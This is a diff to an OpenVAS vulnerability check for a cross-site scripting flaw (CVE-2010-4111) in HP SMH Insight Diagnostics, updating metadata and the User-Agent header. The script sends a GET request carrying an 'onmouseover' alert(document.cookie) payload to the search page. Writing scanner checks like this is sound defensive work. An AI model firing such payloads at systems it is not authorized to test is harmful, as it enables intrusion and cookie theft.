@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_hp_smh_insight_diag_help_xss_vuln.nasl 3516 2016-06-14 12:25:12Z mime $
+# $Id: secpod_hp_smh_insight_diag_help_xss_vuln.nasl 5840 2017-04-03 12:02:24Z cfi $
 #
 # HP SMH Insight Diagnostics 'help/search.php?' Cross Site Scripting Vulnerability
 #
@@ -29,8 +29,8 @@ CPE = "cpe:/a:hp:system_management_homepage";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902431");
-  script_version("$Revision: 3516 $");
-  script_tag(name:"last_modification", value:"$Date: 2016-06-14 14:25:12 +0200 (Tue, 14 Jun 2016) $");
+  script_version("$Revision: 5840 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-04-03 14:02:24 +0200 (Mon, 03 Apr 2017) $");
   script_tag(name:"creation_date", value:"2011-06-01 11:16:16 +0200 (Wed, 01 Jun 2011)");
   script_cve_id("CVE-2010-4111");
   script_bugtraq_id(45420);
@@ -38,7 +38,6 @@ if(description)
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
   script_name("HP SMH Insight Diagnostics 'help/search.php?' Cross Site Scripting Vulnerability");
 
-  script_summary("Check HP SMH Insight Diagnostics is vulnerable to XSS Attack");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (c) 2011 SecPod");
   script_family("Web application abuses");
@@ -75,24 +74,23 @@ include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
 
-## Get HTTP Port
 if(!hpsmhPort = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-## Get Host Name
 host = http_host_name(port:hpsmhPort);
 
 ## Construct XSS GET Attack request
 attackPath = '/hpdiags/frontend2/help/search.php?query="onmouseover=' +
              '"alert(document.cookie);';
-req = string( "GET ", attackPath, " HTTP/1.1\r\n", "Host: ", host, "\r\n",
-               "User-Agent: Portale e-commerce SQL Injection Test\r\n",
-               "Cookie: Compaq-HMMD=0001-8a3348dc-f004-4dae-a746-211a6" +
-               "d70fd51-1292315018889768; HPSMH-browser-check=done for" +
-               " this session; curlocation-hpsmh_anonymous=; PHPSESSID=" +
-               "2389b2ac7c2fb11b7927ab6e54c43e64\r\n",
-               "\r\n");
+req = string( "GET ", attackPath, " HTTP/1.1\r\n",
+              "Host: ", host, "\r\n",
+              "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
+              "Cookie: Compaq-HMMD=0001-8a3348dc-f004-4dae-a746-211a6" +
+              "d70fd51-1292315018889768; HPSMH-browser-check=done for" +
+              " this session; curlocation-hpsmh_anonymous=; PHPSESSID=" +
+              "2389b2ac7c2fb11b7927ab6e54c43e64\r\n",
+              "\r\n");
 
 ## Receive the response
 rcvRes = http_keepalive_send_recv(port:hpsmhPort, data:req);
